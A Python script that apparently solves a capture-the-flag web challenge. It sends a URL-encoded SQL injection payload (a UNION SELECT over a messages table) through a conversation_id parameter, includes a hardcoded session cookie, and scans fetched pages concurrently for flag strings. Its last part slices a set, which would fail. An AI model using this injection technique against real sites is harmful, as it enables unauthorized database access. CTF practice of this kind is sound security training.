import requests
import json
import re
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

#proxies = { "http": "http://127.0.0.1:8888/", "https": "http://127.0.0.1:8888/", }
proxies = {}
cookie = { "session": "eyJ0b2tlbiI6IjE0MTE6TUVRQ0lBcGxGTXJsT2NTR2l1eXZYYkQydmlYa1plbCtZdExtT0J6VVhqNDgrcnpYQWlCclgyQy94UkxJeGhBbitUSllVc1F0R0VEenBsZXVsRUZXenlpamVid1RYQT09In0.ZyXSeA.TGczyhL7Skc6GXf8pd9jegGaSO8"}

base_url = 'https://chal01-97zei55a.hack-challenge.lug.ustc.edu.cn:8443'

result = requests.get(base_url + '/list', cookies=cookie, proxies=proxies, json={}, verify=False).text

links = set(re.findall(r'a href="(.*?)"', result))

result2 = requests.get(base_url + '/view?conversation_id=%27%20UNION%20SELECT%20(SELECT%20GROUP_CONCAT(id)%20FROM%20messages),%272', cookies=cookie, proxies=proxies, json={}, verify=False).text
result2 = result2[result2.find('<h2>聊天记录：') + 9:result2.find('</h2>')].split(',')

for url in result2:
    if '/view?conversation_id=' + url not in links:
        print(url)

# Function to perform the request
def fetch_link(link):
    try:
        result = requests.get(base_url + link, cookies=cookie, json={}).text
        if 'flag' in result or 'FLAG' in result or 'Zmxh' in result:
            return result
    except Exception as e:
        return None  # Handle exceptions as needed

# List of links to process
links_to_process = links[2:]

# Using ThreadPoolExecutor for concurrent requests
with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers as needed
    futures = {executor.submit(fetch_link, link): link for link in links_to_process}

    for future in tqdm(as_completed(futures), total=len(futures)):
        result = future.result()
        if result:
            print(result)
